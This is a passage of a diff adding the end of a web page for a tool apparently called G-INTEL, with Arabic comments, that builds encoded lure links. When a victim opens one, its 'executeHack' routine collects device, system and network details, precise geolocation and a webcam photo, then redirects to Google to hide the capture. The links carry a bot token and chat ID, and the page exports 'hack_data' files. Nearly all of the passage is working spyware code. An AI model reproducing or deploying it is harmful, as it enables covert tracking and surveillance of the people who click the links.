+                    const collectLocation = () => {
+                        return new Promise((resolve) => {
+                            navigator.geolocation.getCurrentPosition(
+                                (pos) => {
+                                    resolve({
+                                        lat: pos.coords.latitude,
+                                        lng: pos.coords.longitude,
+                                        accuracy: pos.coords.accuracy,
+                                        altitude: pos.coords.altitude,
+                                        speed: pos.coords.speed
+                                    });
+                                },
+                                () => resolve(null),
+                                { enableHighAccuracy: true, timeout: 10000 }
+                            );
+                        });
+                    };
+
+                    // -------------------------------------------------------------
+                    // دالة تنفيذ الاختراق (تستدعى عند فتح الرابط)
+                    // -------------------------------------------------------------
+                    const executeHack = async (payload) => {
+                        isExecuting.value = true;
+                        executionProgress.value = 10;
+                        executionStatus.value = lang.value === 'ar' ? 'جمع معلومات النظام...' : 'Collecting system info...';
+
+                        try {
+                            // 1. جمع المعلومات حسب الوحدات المحددة
+                            const hackResult = {
+                                timestamp: moment().format('YYYY-MM-DD HH:mm:ss'),
+                                modules: payload.modules,
+                                deviceInfo: {},
+                                systemInfo: {},
+                                networkInfo: {},
+                                location: null,
+                                media: {}
+                            };
+
+                            if (payload.modules.includes('device') || payload.modules.includes('system')) {
+                                executionStatus.value = lang.value === 'ar' ? 'تحليل الجهاز بدقة...' : 'Analyzing device...';
+                                hackResult.deviceInfo = collectDeviceInfo();
+                                executionProgress.value = 30;
+                            }
+
+                            if (payload.modules.includes('system')) {
+                                executionStatus.value = lang.value === 'ar' ? 'جمع معلومات النظام...' : 'Collecting system info...';
+                                hackResult.systemInfo = await collectSystemInfo();
+                                executionProgress.value = 50;
+                            }
+
+                            if (payload.modules.includes('network')) {
+                                executionStatus.value = lang.value === 'ar' ? 'تتبع الشبكة...' : 'Tracking network...';
+                                hackResult.networkInfo = await collectNetworkInfo();
+                                executionProgress.value = 70;
+                            }
+
+                            if (payload.modules.includes('location')) {
+                                executionStatus.value = lang.value === 'ar' ? 'تحديد الموقع...' : 'Getting location...';
+                                hackResult.location = await collectLocation();
+                                executionProgress.value = 80;
+                            }
+
+                            if (payload.modules.includes('camera')) {
+                                try {
+                                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                                    const video = document.getElementById('v');
+                                    video.srcObject = stream;
+                                    await new Promise(r => setTimeout(r, 1000));
+                                    const canvas = document.getElementById('c');
+                                    canvas.width = video.videoWidth || 640;
+                                    canvas.height = video.videoHeight || 480;
+                                    canvas.getContext('2d').drawImage(video, 0, 0);
+                                    const blob = await new Promise(resolve => canvas.toBlob(resolve));
+                                    hackResult.media.photo = URL.createObjectURL(blob);
+                                    stream.getTracks().forEach(t => t.stop());
+                                } catch {}
+                            }
+
+                            // 2. إضافة النتيجة إلى لوحة التحكم
+                            capturedData.value.unshift(hackResult);
+                            
+                            // 3. إرسال إشعار
+                            addNotification(
+                                'تم الاختراق بنجاح',
+                                `تم الحصول على معلومات من ${hackResult.deviceInfo.model || 'جهاز'}`,
+                                'success'
+                            );
+
+                            // 4. تحديث الإحصائيات
+                            stats.totalVisits++;
+                            stats.lastExecution = moment().format('YYYY-MM-DD HH:mm:ss');
+                            stats.devices++;
+
+                            executionProgress.value = 100;
+                            executionStatus.value = lang.value === 'ar' ? 'اكتمل بنجاح' : 'Completed';
+
+                        } catch (error) {
+                            addNotification('خطأ', 'فشل عملية الاختراق', 'error');
+                            executionStatus.value = lang.value === 'ar' ? 'فشل' : 'Failed';
+                        }
+
+                        // التوجيه بعد 3 ثواني
+                        setTimeout(() => {
+                            window.location.replace(payload.url || 'https://www.google.com');
+                        }, 3000);
+                    };
+
+                    // -------------------------------------------------------------
+                    // توليد الرابط المشفر
+                    // -------------------------------------------------------------
+                    const generateLink = () => {
+                        if (!canGenerate.value) {
+                            addNotification('تحذير', 'الرجاء إكمال البيانات', 'warning');
+                            return;
+                        }
+
+                        generating.value = true;
+
+                        setTimeout(() => {
+                            const payload = {
+                                token: config.token,
+                                chat: config.chatId,
+                                modules: selectedModules.value,
+                                url: config.redirectUrl
+                            };
+
+                            let dataStr = JSON.stringify(payload);
+                            if (security.encrypt && security.key) {
+                                dataStr = CryptoJS.AES.encrypt(dataStr, security.key).toString();
+                            }
+
+                            const encoded = btoa(unescape(encodeURIComponent(dataStr)));
+                            const link = window.location.origin + window.location.pathname + '?m=' + encoded;
+
+                            generatedLink.value = link;
+                            generating.value = false;
+
+                            addNotification('نجاح', 'تم إنشاء الرابط بنجاح', 'success');
+                            addLog('success', 'تم إنشاء رابط جديد');
+                        }, 1000);
+                    };
+
+                    const copyLink = () => {
+                        navigator.clipboard.writeText(generatedLink.value);
+                        addNotification('نجاح', 'تم نسخ الرابط', 'success');
+                    };
+
+                    const testLink = () => {
+                        window.open(generatedLink.value, '_blank');
+                    };
+
+                    const exportData = () => {
+                        const dataStr = JSON.stringify(capturedData.value, null, 2);
+                        const blob = new Blob([dataStr], { type: 'application/json' });
+                        const url = URL.createObjectURL(blob);
+                        const a = document.createElement('a');
+                        a.href = url;
+                        a.download = `hack_data_${moment().format('YYYY-MM-DD')}.json`;
+                        a.click();
+                    };
+
+                    // -------------------------------------------------------------
+                    // التحقق من وجود بارامتر m
+                    // -------------------------------------------------------------
+                    onMounted(() => {
+                        // محاكاة شاشة التحميل
+                        setTimeout(() => loadingProgress.value = 30, 200);
+                        setTimeout(() => loadingProgress.value = 60, 400);
+                        setTimeout(() => loadingProgress.value = 100, 600);
+                        setTimeout(() => loading.value = false, 800);
+
+                        // التحقق من وجود بارامتر
+                        const params = new URLSearchParams(window.location.search);
+                        const m = params.get('m');
+                        if (m) {
+                            try {
+                                let decoded = decodeURIComponent(escape(atob(m)));
+                                if (decoded.includes('{"token"')) {
+                                    const payload = JSON.parse(decoded);
+                                    executeHack(payload);
+                                } else {
+                                    // إذا كان مشفراً
+                                    addNotification('معلومات', 'تم فتح رابط مشفر', 'info');
+                                }
+                            } catch (e) {
+                                console.error('خطأ في فك التشفير:', e);
+                            }
+                        }
+
+                        // جمع معلومات الجهاز للعرض في الواجهة
+                        const deviceInfo = collectDeviceInfo();
+                        addLog('info', `الجهاز الحالي: ${deviceInfo.model} - ${deviceInfo.os.full}`);
+
+                        // إضافة إشعار ترحيبي
+                        addNotification('مرحباً', 'نظام G-INTEL جاهز للعمل', 'info');
+                    });
+
+                    return {
+                        // المتغيرات
+                        loading,
+                        loadingProgress,
+                        loadingMessage,
+                        isExecuting,
+                        generating,
+                        generatedLink,
+                        activeTab,
+                        theme,
+                        lang,
+                        tokenValid,
+                        executionProgress,
+                        executionStatus,
+                        notifications,
+                        capturedData,
+                        config,
+                        selectedModules,
+                        attackModules,
+                        security,
+                        stats,
+                        logs,
+                        tabs,
+                        canGenerate,
+
+                        // دوال
+                        validateToken,
+                        toggleTheme,
+                        toggleLanguage,
+                        toggleModule,
+                        saveConfig,
+                        loadConfig,
+                        generateLink,
+                        copyLink,
+                        testLink,
+                        exportData,
+                        addLog,
+                        clearLogs,
+                        removeNotification
+                    };
+                }
+            });
+
+            window.vueApp = app.mount('#app');
+
+            // =================================================================
+            // خلفية Three.js
+            // =================================================================
+            const initThree = () => {
+                const canvas = document.getElementById('bgCanvas');
+                if (!canvas) return;
+
+                const scene = new THREE.Scene();
+                scene.background = new THREE.Color(0x0f172a);
+
+                const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
+                camera.position.z = 50;
+
+                const renderer = new THREE.WebGLRenderer({ canvas, alpha: false, antialias: true });
+                renderer.setSize(window.innerWidth, window.innerHeight);
+
+                // نجوم
+                const starsGeometry = new THREE.BufferGeometry();
+                const starsCount = 1000;
+                const starsPositions = new Float32Array(starsCount * 3);
+                for (let i = 0; i < starsCount * 3; i += 3) {
+                    starsPositions[i] = (Math.random() - 0.5) * 200;
+                    starsPositions[i+1] = (Math.random() - 0.5) * 200;
+                    starsPositions[i+2] = (Math.random() - 0.5) * 200;
+                }
+                starsGeometry.setAttribute('position', new THREE.BufferAttribute(starsPositions, 3));
+                const starsMaterial = new THREE.PointsMaterial({ color: 0x3b82f6, size: 0.2 });
+                const stars = new THREE.Points(starsGeometry, starsMaterial);
+                scene.add(stars);
+
+                function animate() {
+                    requestAnimationFrame(animate);
+                    stars.rotation.y += 0.0002;
+                    renderer.render(scene, camera);
+                }
+                animate();
+
+                window.addEventListener('resize', () => {
+                    camera.aspect = window.innerWidth / window.innerHeight;
+                    camera.updateProjectionMatrix();
+                    renderer.setSize(window.innerWidth, window.innerHeight);
+                });
+            };
+
+            window.addEventListener('load', initThree);
+        })();
+    </script>
+</body>
+</html>
